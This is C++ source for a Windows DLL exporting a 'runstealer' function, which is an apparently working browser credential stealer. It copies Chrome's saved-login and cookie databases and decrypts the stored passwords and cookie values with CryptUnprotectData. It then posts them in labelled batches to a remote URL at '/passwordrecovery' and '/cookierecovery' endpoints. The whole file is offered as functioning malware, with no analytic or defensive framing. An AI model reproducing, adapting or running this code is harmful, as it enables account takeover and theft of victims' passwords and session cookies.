#include "pch.h"
#include <stdio.h> 
#include <string>
#include "sqlite3.h"
#include "DarkRequest.h"
#include <Wincrypt.h>
#include <fstream>
#pragma warning(disable:4996)
#pragma comment(lib, "Crypt32")
extern "C"
{

	std::string getCookies(
		sqlite3* db,
		std::string sql,
		std::string url
	) {

		std::stringstream dump;

		//SELECT * FROM cookies WHERE 'https://github.com/session' LIKE CONCAT('%', cookies.HOST_KEY, '%')
		//std::stringstream dump(std::string("")); // String stream for our output
	//	const char* zSql = "SELECT * FROM cookies WHERE instr('"+url+"', HOST_KEY) > 0";
		const char* zSql = sql.c_str();
		sqlite3_stmt* pStmt;
		int rc;

		/* Compile the SELECT statement into a virtual machine. */
		rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
		if (rc != SQLITE_OK) {
			//std::cout << "statement failed rc = " << rc << std::endl;
			return "";
		}
		//std::cout << "statement prepared " << std::endl;

		/* So call sqlite3_step() once
		** only. Normally, we would keep calling sqlite3_step until it
		** returned something other than SQLITE_ROW.
		*/
		rc = sqlite3_step(pStmt);
		//std::cout << "RC: " << rc << std::endl;
		while (rc == SQLITE_ROW) {
			dump << "#D|C#";
			dump << "#dark~#";
			dump << sqlite3_column_text(pStmt, 0);
			dump << "#dark~#";
			dump << (char*)sqlite3_column_text(pStmt, 1);
			dump << "#dark~#";
			DATA_BLOB encryptedPass, decryptedPass;

			encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
			encryptedPass.pbData = (BYTE*)malloc((int)encryptedPass.cbData);

			memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

			CryptUnprotectData(
				&encryptedPass, // In Data
				NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
				NULL,           // Optional entropy
				NULL,           // Reserved
				NULL,           // Here, the optional
								// prompt structure is not
								// used.
				0,
				&decryptedPass);
			char* c = (char*)decryptedPass.pbData;
			while (isprint(*c)) {
				dump << *c;
				c++;
			}
			dump << "#D|C#";
			postRequest(url+"/cookierecovery",  "cookies=" + dump.str(), "POST");
			dump.str("");
			Sleep(2);
			rc = sqlite3_step(pStmt);
		}

		/* Finalize the statement (this releases resources allocated by
		** sqlite3_prepare() ).
		*/
		rc = sqlite3_finalize(pStmt);


		return "success";
	}

	sqlite3* getDBHandler(char* dbFilePath) {
		sqlite3* db;
		int rc = sqlite3_open(dbFilePath, &db);
		if (rc)
		{
			std::cerr << "Error opening SQLite3 database: " << sqlite3_errmsg(db) << std::endl << std::endl;
			sqlite3_close(db);
			return nullptr;
		}
		else
		{
			std::cout << dbFilePath << " DB Opened." << std::endl << std::endl;
			return db;
		}
	}

	std::stringstream getPass(
		sqlite3* db,
		std::string url
	) {
		std::stringstream dump(std::string("")); // String stream for our output
		const char* zSql = "SELECT action_url, username_value, password_value FROM logins";
		sqlite3_stmt* pStmt;
		int rc;

		/* Compile the SELECT statement into a virtual machine. */
		rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
		if (rc != SQLITE_OK) {
			std::cout << "statement failed rc = " << rc << std::endl;
			return dump;
		}
		std::cout << "statement prepared " << std::endl;

		/* So call sqlite3_step() once
		** only. Normally, we would keep calling sqlite3_step until it
		** returned something other than SQLITE_ROW.
		*/
		rc = sqlite3_step(pStmt);
		//std::cout << "RC: " << rc << std::endl;
		while (rc == SQLITE_ROW) {
			dump << "#N_U#";
			dump << "#dark~#";
			dump << sqlite3_column_text(pStmt, 0); //URL
			dump << "#dark~#";
			dump << (char*)sqlite3_column_text(pStmt, 1); //User
			dump << "#dark~#";
			DATA_BLOB encryptedPass, decryptedPass;



			std::string url((char*)sqlite3_column_text(pStmt, 0));
			std::string sql = "SELECT HOST_KEY,name,encrypted_value FROM cookies WHERE instr('" + url + "',HOST_KEY) > 0";
			std::cout << sql;
			sqlite3* cookiesDb = getDBHandler((char*)"cookiesDB");
			getCookies(cookiesDb, sql, url);
			//argumentsCookie = "cookies="+cookies.str();
			if (sqlite3_close(cookiesDb) == SQLITE_OK)
				std::cout << "DB connection closed properly" << std::endl;
			else
				std::cout << "Failed to close DB connection" << std::endl;




			encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
			encryptedPass.pbData = (BYTE*)malloc((int)encryptedPass.cbData);

			memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

			CryptUnprotectData(
				&encryptedPass, // In Data
				NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
				NULL,           // Optional entropy
				NULL,           // Reserved
				NULL,           // Here, the optional
								// prompt structure is not
								// used.
				0,
				&decryptedPass);
			char* c = (char*)decryptedPass.pbData;
			while (isprint(*c)) {
				dump << *c;
				c++;
			}

			dump << "#N_U#"; //Pass
			rc = sqlite3_step(pStmt);
		}

		/* Finalize the statement (this releases resources allocated by
		** sqlite3_prepare() ).
		*/
		rc = sqlite3_finalize(pStmt);

		return dump;
	}

	//relative to chrome directory
	bool copyDB(char* source, char* dest) {
		//Form path for Chrome's Login Data 
		std::string path = getenv("LOCALAPPDATA");
		path.append("\\Google\\Chrome\\User Data\\Default\\");
		path.append(source);
		//copy the sqlite3 db from chrome directory 
		//as we are not allowed to open it directly from there (chrome could also be running)
		std::ifstream  src(path, std::ios::binary);
		std::ofstream  dst(dest, std::ios::binary);
		dst << src.rdbuf();
		dst.close();
		src.close();
		return true; //ToDo: error handling
	}

	int deleleteDB(const char* fileName) {
		if (remove(fileName) != 0)
			std::cout << "Could not delete " << fileName << std::endl;
		else
			std::cout << fileName << " deleted... Bye bye" << std::endl;
		return 1;
	}






	__declspec(dllexport) void runstealer(std::string url)
	{
		//printf("Hello from DLL !\n");
		std::string method = "POST";
		std::string arguments;
		std::string argumentsCookie;
		std::string output;
		int rc;
		// Open Database

		std::cout << "Copying db ..." << std::endl;

		copyDB((char*)"Login Data", (char*)"passwordsDB");
		sqlite3* passwordsDB = getDBHandler((char*)"passwordsDB");

		copyDB((char*)"Cookies", (char*)"cookiesDB");


		std::string passwords = getPass(passwordsDB,url).str();
		arguments = "pass=" + passwords;
		std::cout << arguments;
		if (sqlite3_close(passwordsDB) == SQLITE_OK)
			std::cout << "DB connection closed properly" << std::endl;
		else
			std::cout << "Failed to close DB connection" << std::endl;

		postRequest(url +"/passwordrecovery", arguments, "POST");







	}
}